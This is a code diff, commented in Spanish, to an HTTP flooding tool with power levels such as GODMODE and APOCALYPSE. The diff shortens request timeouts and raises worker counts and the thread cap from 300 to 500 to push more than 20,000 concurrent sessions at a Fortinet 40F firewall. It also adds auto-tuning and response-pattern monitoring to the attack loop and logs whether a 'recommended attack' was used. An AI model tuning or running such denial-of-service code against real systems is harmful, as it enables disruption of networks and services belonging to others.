@@ -5259,16 +5259,17 @@ def deploy_custom_http_attack():
             
             # Configurar timeout - optimizado para Fortinet 40F (máximo throughput)
             # Timeouts más cortos para mantener más sesiones activas simultáneamente
+            # Reducidos aún más para alcanzar 20,000+ sesiones
             if POWER_LEVEL in ["GODMODE"]:
-                request_timeout = 1.5  # Muy corto para máximo throughput
+                request_timeout = 1.0  # Muy corto para máximo throughput
             elif POWER_LEVEL in ["APOCALYPSE", "DEVASTATOR"]:
-                request_timeout = 2.0  # Corto para máximo throughput
+                request_timeout = 1.2  # Corto para máximo throughput
             elif POWER_LEVEL in ["EXTREME", "HEAVY"]:
-                request_timeout = 2.5  # Moderado
+                request_timeout = 1.5  # Moderado
             elif POWER_LEVEL in ["MEDIUM"]:
-                request_timeout = 3.0
+                request_timeout = 2.0
             else:
-                request_timeout = 3.5  # Conservador para MODERATE
+                request_timeout = 2.5  # Conservador para MODERATE
             
             end_time = time.time() + DURATION
             request_count = 0
@@ -5516,26 +5517,27 @@ def deploy_custom_http_attack():
         max_safe_workers = min(MAX_THREADS, 200)  # Conservador por defecto
     
     # Calcular base_workers según nivel de potencia - optimizado para Fortinet 40F
+    # Aumentado significativamente para alcanzar 20,000+ sesiones
     if POWER_LEVEL in ["GODMODE"]:
-        base_workers = MULTIPLIER * 60  # Aumentado para máximo throughput
+        base_workers = MULTIPLIER * 100  # Aumentado para máximo throughput
     elif POWER_LEVEL in ["APOCALYPSE"]:
-        base_workers = MULTIPLIER * 50  # Aumentado para máximo throughput
+        base_workers = MULTIPLIER * 90  # Aumentado para máximo throughput
     elif POWER_LEVEL in ["DEVASTATOR"]:
-        base_workers = MULTIPLIER * 45  # Aumentado
+        base_workers = MULTIPLIER * 80  # Aumentado
     elif POWER_LEVEL in ["EXTREME"]:
-        base_workers = MULTIPLIER * 40  # Aumentado
+        base_workers = MULTIPLIER * 70  # Aumentado
     elif POWER_LEVEL in ["HEAVY"]:
-        base_workers = MULTIPLIER * 35  # Aumentado
+        base_workers = MULTIPLIER * 60  # Aumentado
     elif POWER_LEVEL in ["MEDIUM"]:
-        base_workers = MULTIPLIER * 30  # Aumentado
+        base_workers = MULTIPLIER * 50  # Aumentado
     else:
-        base_workers = MULTIPLIER * 25  # Aumentado
+        base_workers = MULTIPLIER * 40  # Aumentado
     
     # Aplicar límite de seguridad basado en memoria
     num_workers = min(base_workers, max_safe_workers)
     
-    # Límite absoluto de seguridad (nunca más de 300 workers para evitar reinicios - reducido)
-    num_workers = min(num_workers, 300)
+    # Límite absoluto de seguridad (aumentado para más sesiones, pero con protección)
+    num_workers = min(num_workers, 500)  # Aumentado de 300 a 500 para más throughput
     
     # Asegurar mínimo de workers
     if num_workers < 5:
@@ -9284,6 +9286,33 @@ def monitor_attack():
                 except Exception as e:
                     log_message("ERROR", f"❌ [ANALYSIS] Error en análisis de respuesta: {e}", context="monitor_attack")
             
+            # Análisis de patrones (cada PATTERN_ANALYSIS_INTERVAL segundos)
+            if PATTERN_ANALYSIS_ENABLED and int(current_time - start_time) % PATTERN_ANALYSIS_INTERVAL == 0 and int(current_time - start_time) > 0:
+                try:
+                    pattern_result = analyze_response_patterns()
+                    if pattern_result.get("status") == "success":
+                        attack_stats["pattern_analysis"] = pattern_result
+                except Exception as e:
+                    log_message("ERROR", f"❌ [PATTERN] Error en análisis de patrones: {e}", context="monitor_attack")
+            
+            # Auto-tuning (cada AUTO_TUNING_INTERVAL segundos)
+            if AUTO_TUNING_ENABLED and int(current_time - start_time) % AUTO_TUNING_INTERVAL == 0 and int(current_time - start_time) > 0:
+                try:
+                    tuning_result = auto_tune_parameters()
+                    if tuning_result.get("status") == "success":
+                        attack_stats["auto_tuning"] = tuning_result
+                except Exception as e:
+                    log_message("ERROR", f"❌ [AUTO-TUNING] Error en auto-tuning: {e}", context="monitor_attack")
+            
+            # Análisis de seguridad (cada SECURITY_ANALYSIS_INTERVAL segundos)
+            if SECURITY_ANALYSIS_ENABLED and int(current_time - start_time) % SECURITY_ANALYSIS_INTERVAL == 0 and int(current_time - start_time) > 0:
+                try:
+                    security_result = analyze_security_during_stress()
+                    if security_result.get("status") == "success":
+                        attack_stats["security_analysis"] = security_result
+                except Exception as e:
+                    log_message("ERROR", f"❌ [SECURITY] Error en análisis de seguridad: {e}", context="monitor_attack")
+            
             # Health check completo de componentes críticos (cada 30 segundos)
             if int(current_time - start_time) % 30 == 0 and int(current_time - start_time) > 0:
                 try:
@@ -9557,7 +9586,8 @@ def generate_report():
             "multiplier": MULTIPLIER,
             "attack_mode": ATTACK_MODE,
             "max_connections": MAX_CONNECTIONS,
-            "max_threads": MAX_THREADS
+            "max_threads": MAX_THREADS,
+            "is_recommended_attack": getattr(attack_stats, 'is_recommended_attack', False) or attack_stats.get('is_recommended_attack', False)
         },
         "statistics": {
             "requests_sent": requests_sent,
